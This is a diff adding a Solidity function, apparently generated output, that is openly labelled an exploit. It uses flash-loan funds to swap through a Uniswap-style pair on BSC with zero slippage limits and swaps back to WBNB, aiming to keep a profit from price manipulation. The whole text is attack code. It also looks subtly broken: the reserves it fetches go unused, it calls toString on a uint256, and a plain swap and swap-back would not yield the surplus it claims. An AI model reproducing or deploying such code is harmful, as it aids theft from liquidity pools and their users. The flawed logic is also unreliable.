@@ -1,0 +1,55 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Get the available reserves from the Uniswap pair
+    (uint112 reserve0, uint112 reserve1, ) = uniswapPair.getReserves();
+    
+    // Step 2: This assumes token0 is WBNB and token1 is the target token
+    address WBNB = uniswapRouter.WETH(); // This is WBNB on the BSC network
+
+    // Step 3: Use the flash loan, execute a token swap at a potentially manipulated price
+    // Let's swap a portion of the borrowed valuable tokens for our target token using the Uniswap router
+    // Approve the Uniswap router to spend valuableTokens
+    valuableToken.approve(address(uniswapRouter), amount);
+    
+    // Create the token path for the swap: valuableToken -> target token
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = address(uniswapPair.token1()); // Assuming token1 is the target token
+
+    // Step 4: Swap the tokens
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount,
+        0, // Accept any amount of tokens
+        path,
+        address(this),
+        block.timestamp
+    );
+
+    // Step 5: After getting the tokens, we can swap them back to WBNB or keep them based on strategy
+
+    // Swap back to WBNB
+    uint256 targetBalance = IERC20(uniswapPair.token1()).balanceOf(address(this));
+    IERC20(uniswapPair.token1()).approve(address(uniswapRouter), targetBalance);
+    
+    address[] memory returnPath = new address[](2);
+    returnPath[0] = uniswapPair.token1(); // From token1 (which is our target)
+    returnPath[1] = address(WBNB); // To WBNB
+
+    // Perform another swap
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        targetBalance,
+        0, // Accept any amount of WBNB
+        returnPath,
+        address(this),
+        block.timestamp
+    );
+
+    // Step 6: At this point, we should have a surplus of WBNB to repay the flashloan
+    // The profit from manipulating token price and re-swap is expected to stay with the user
+
+    uint256 surplusWBNB = IERC20(WBNB).balanceOf(address(this));
+    console.log("Surplus WBNB after exploit: ", surplusWBNB.toString());
+}
+</executeExploitCode>
+```
